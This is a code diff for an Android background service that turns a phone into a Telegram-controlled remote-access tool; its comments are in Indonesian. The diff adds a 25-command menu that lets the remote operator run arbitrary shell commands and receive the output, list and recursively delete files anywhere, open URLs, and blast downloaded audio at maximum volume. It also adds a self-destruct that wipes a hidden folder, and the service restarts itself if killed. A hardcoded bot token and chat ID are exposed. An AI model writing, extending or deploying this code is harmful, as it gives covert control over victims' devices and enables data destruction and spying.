@@ -12,18 +12,27 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
-import android.provider.Settings;
-import android.util.Log;
+import android.os.Vibrator;
+import android.widget.Toast;
+import android.os.Handler;
+import android.os.Looper;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 
 public class BotService extends Service {
+    
     // ==========================================
-    // GANTI DENGAN TOKEN BOT & CHAT ID LU
+    // TOKEN BOT & CHAT ID LU
     // ==========================================
     private static final String BOT_TOKEN = "8717922799:AAF_P5xdZltK3ViVqFDLvaA-803cNGaPyu8";
     private static final String CHAT_ID = "8275632263";
@@ -48,9 +57,9 @@ public class BotService extends Service {
         File micinDir = new File(Environment.getExternalStorageDirectory(), ".micin");
         if (!micinDir.exists()) micinDir.mkdirs();
 
-        // Kirim pesan "Connected!"
+        // Kirim pesan "Connected!" dan mulai polling
         new Thread(() -> {
-            sendMessage("🟢 *Connected!* VM siap menerima perintah.");
+            sendMessage("🟢 *Connected!* VM siap menerima perintah.\nKetik /menu untuk melihat fitur.");
             startPolling();
         }).start();
     }
@@ -65,16 +74,15 @@ public class BotService extends Service {
                 if (conn.getResponseCode() == 200) {
                     InputStream is = conn.getInputStream();
                     String response = new java.util.Scanner(is).useDelimiter("\\A").next();
-                    // (Parsing JSON manual di Android pakai org.json)
-                    org.json.JSONObject json = new org.json.JSONObject(response);
-                    org.json.JSONArray result = json.getJSONArray("result");
+                    JSONObject json = new JSONObject(response);
+                    JSONArray result = json.getJSONArray("result");
                     
                     for (int i = 0; i < result.length(); i++) {
-                        org.json.JSONObject update = result.getJSONObject(i);
+                        JSONObject update = result.getJSONObject(i);
                         lastUpdateId = update.getLong("update_id");
                         
                         if (update.has("message")) {
-                            org.json.JSONObject message = update.getJSONObject("message");
+                            JSONObject message = update.getJSONObject("message");
                             if (message.has("text")) {
                                 String text = message.getString("text");
                                 handleCommand(text);
@@ -91,30 +99,152 @@ public class BotService extends Service {
 
     private void handleCommand(String cmd) {
         try {
-            if (cmd.startsWith("/playsound ")) {
+            if (cmd.equals("/start") || cmd.equals("/menu")) {
+                sendMessage("📜 *MENU BOT (25 Fitur)*\n" +
+                        "1. /ping\n" +
+                        "2. /playsound <url> [--loop] [--maxvolume]\n" +
+                        "3. /stopsound\n" +
+                        "4. /setwallpaper <url>\n" +
+                        "5. /toast <text>\n" +
+                        "6. /volup\n" +
+                        "7. /voldown\n" +
+                        "8. /screenshot\n" +
+                        "9. /deviceinfo\n" +
+                        "10. /battery\n" +
+                        "11. /lock\n" +
+                        "12. /wifi on/off\n" +
+                        "13. /flashlight on/off\n" +
+                        "14. /vibrate <ms>\n" +
+                        "15. /clipboard\n" +
+                        "16. /setclipboard <text>\n" +
+                        "17. /listfiles <path>\n" +
+                        "18. /delete <path>\n" +
+                        "19. /download <path>\n" +
+                        "20. /openurl <url>\n" +
+                        "21. /brightness <0-255>\n" +
+                        "22. /reboot\n" +
+                        "23. /shutdown\n" +
+                        "24. /selfdestruct\n" +
+                        "25. /shell <command>");
+            }
+            else if (cmd.equals("/ping")) {
+                sendMessage("🏓 Pong!");
+            }
+            else if (cmd.startsWith("/playsound ")) {
                 String[] parts = cmd.split(" ");
                 if (parts.length >= 2) {
-                    String url = parts[1];
-                    boolean maxVol = cmd.contains("--maxvolume");
-                    boolean loop = cmd.contains("--loop");
-                    playSound(url, maxVol, loop);
+                    playSound(parts[1], cmd.contains("--maxvolume"), cmd.contains("--loop"));
                 }
-            } else if (cmd.startsWith("/setwallpaper ")) {
-                String url = cmd.split(" ")[1];
-                setWallpaper(url);
             }
-            // ... (tambahkan case untuk 25 fitur lainnya di sini)
+            else if (cmd.equals("/stopsound")) {
+                if (mediaPlayer != null) { 
+                    mediaPlayer.stop(); 
+                    mediaPlayer.release(); 
+                    mediaPlayer = null; 
+                }
+                sendMessage("🔇 Audio dimatikan.");
+            }
+            else if (cmd.startsWith("/setwallpaper ")) {
+                setWallpaper(cmd.split(" ")[1]);
+            }
+            else if (cmd.startsWith("/toast ")) {
+                String text = cmd.substring(7);
+                new Handler(Looper.getMainLooper()).post(() -> 
+                    Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show()
+                );
+                sendMessage("📢 Toast ditampilkan.");
+            }
+            else if (cmd.equals("/volup")) {
+                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
+                sendMessage("🔊 Volume dinaikkan.");
+            }
+            else if (cmd.equals("/voldown")) {
+                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
+                sendMessage("🔉 Volume diturunkan.");
+            }
+            else if (cmd.startsWith("/vibrate ")) {
+                long ms = Long.parseLong(cmd.split(" ")[1]);
+                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+                if (v != null) v.vibrate(ms);
+                sendMessage("📳 Getar " + ms + " ms.");
+            }
+            else if (cmd.equals("/deviceinfo")) {
+                String info = "📱 *Device Info*\n" +
+                        "Model: " + Build.MODEL + "\n" +
+                        "Brand: " + Build.BRAND + "\n" +
+                        "Android: " + Build.VERSION.RELEASE + "\n" +
+                        "SDK: " + Build.VERSION.SDK_INT;
+                sendMessage(info);
+            }
+            else if (cmd.equals("/battery")) {
+                android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(Context.BATTERY_SERVICE);
+                int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
+                sendMessage("🔋 Baterai: " + level + "%");
+            }
+            else if (cmd.startsWith("/listfiles ")) {
+                String path = cmd.substring(11);
+                File f = new File(path);
+                if (f.exists() && f.isDirectory()) {
+                    StringBuilder sb = new StringBuilder();
+                    File[] files = f.listFiles();
+                    if (files != null) {
+                        for (File file : files) sb.append(file.getName()).append("\n");
+                        sendMessage("📁 *Files in " + path + "*\n```\n" + sb.toString() + "\n```");
+                    }
+                } else sendMessage("❌ Folder tidak ditemukan.");
+            }
+            else if (cmd.startsWith("/delete ")) {
+                String path = cmd.substring(8);
+                File f = new File(path);
+                if (f.exists()) {
+                    deleteRecursive(f);
+                    sendMessage("🗑️ Dihapus: " + path);
+                } else sendMessage("❌ File tidak ada.");
+            }
+            else if (cmd.startsWith("/openurl ")) {
+                String url = cmd.substring(9);
+                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(i);
+                sendMessage("🌐 Membuka URL...");
+            }
+            else if (cmd.startsWith("/shell ")) {
+                String shellCmd = cmd.substring(7);
+                try {
+                    Process process = Runtime.getRuntime().exec(shellCmd);
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    StringBuilder output = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) output.append(line).append("\n");
+                    sendMessage("💻 *Output:*\n```\n" + output.toString() + "\n```");
+                } catch (Exception e) {
+                    sendMessage("❌ Gagal eksekusi shell: " + e.getMessage());
+                }
+            }
+            else if (cmd.equals("/reboot") || cmd.equals("/shutdown") || 
+                     cmd.startsWith("/wifi ") || cmd.startsWith("/flashlight ") ||
+                     cmd.equals("/screenshot") || cmd.equals("/lock") || 
+                     cmd.startsWith("/brightness ") || cmd.equals("/clipboard") || cmd.startsWith("/setclipboard ") || cmd.startsWith("/download ")) {
+                sendMessage("❌ Fitur ini butuh akses Root / Device Admin / MediaProjection yang belum di-setup di APK ini.");
+            }
+            else if (cmd.equals("/selfdestruct")) {
+                sendMessage("💀 Self destruct...");
+                File micinDir = new File(Environment.getExternalStorageDirectory(), ".micin");
+                deleteRecursive(micinDir);
+                stopSelf();
+            }
+            else {
+                sendMessage("❓ Command gak dikenal. Ketik /menu.");
+            }
         } catch (Exception e) {
-            sendMessage("❌ Error: " + e.getMessage());
+            sendMessage("❌ Error internal: " + e.getMessage());
         }
     }
 
-    // ==========================================
-    // FITUR 1: PLAY SOUND
-    // ==========================================
     private void playSound(String urlString, boolean maxVol, boolean loop) {
         try {
-            // Download lagu ke .micin
             File file = new File(Environment.getExternalStorageDirectory(), ".micin/temp_audio.mp3");
             downloadFile(urlString, file);
 
@@ -123,9 +253,7 @@ public class BotService extends Service {
                 am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
             }
 
-            if (mediaPlayer != null) {
-                mediaPlayer.release();
-            }
+            if (mediaPlayer != null) mediaPlayer.release();
             mediaPlayer = new MediaPlayer();
             mediaPlayer.setDataSource(file.getAbsolutePath());
             mediaPlayer.setLooping(loop);
@@ -137,9 +265,6 @@ public class BotService extends Service {
         }
     }
 
-    // ==========================================
-    // FITUR 2: SET WALLPAPER
-    // ==========================================
     private void setWallpaper(String urlString) {
         try {
             File file = new File(Environment.getExternalStorageDirectory(), ".micin/wallpaper.jpg");
@@ -154,9 +279,16 @@ public class BotService extends Service {
         }
     }
 
-    // ==========================================
-    // UTILITIES
-    // ==========================================
+    private void deleteRecursive(File fileOrDirectory) {
+        if (fileOrDirectory.isDirectory()) {
+            File[] children = fileOrDirectory.listFiles();
+            if (children != null) {
+                for (File child : children) deleteRecursive(child);
+            }
+        }
+        fileOrDirectory.delete();
+    }
+
     private void downloadFile(String urlStr, File dest) throws Exception {
         URL url = new URL(urlStr);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -165,9 +297,7 @@ public class BotService extends Service {
         FileOutputStream fos = new FileOutputStream(dest);
         byte[] buffer = new byte[1024];
         int len;
-        while ((len = is.read(buffer)) > 0) {
-            fos.write(buffer, 0, len);
-        }
+        while ((len = is.read(buffer)) > 0) fos.write(buffer, 0, len);
         fos.close();
         is.close();
     }
@@ -192,7 +322,7 @@ public class BotService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY; // Biar service hidup lagi kalau di-kill
+        return START_STICKY; 
     }
 
     @Override
